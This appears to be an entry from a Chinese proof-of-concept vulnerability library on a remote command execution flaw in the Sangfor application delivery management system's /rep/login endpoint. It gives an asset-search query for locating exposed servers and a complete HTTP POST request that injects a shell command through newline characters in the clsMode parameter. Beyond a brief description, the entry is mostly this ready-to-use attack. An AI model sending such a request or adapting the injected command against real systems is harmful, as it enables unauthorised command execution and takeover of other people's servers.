---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 深信服应用交付管理系统rep/login远程命令执行漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">深信服应用交付管理系统login存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 深信服应用交付管理系统7.0.8-7.0.8R5

# 三、资产测绘
+ hunter`app.name="SANGFOR 深信服应用交付报表系统"`


+ 登录页面


# 四、漏洞复现
```plain
POST /rep/login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-type: application/x-www-form-urlencoded
Content-Length: 118

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nfnaaq9o1k6tgszw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
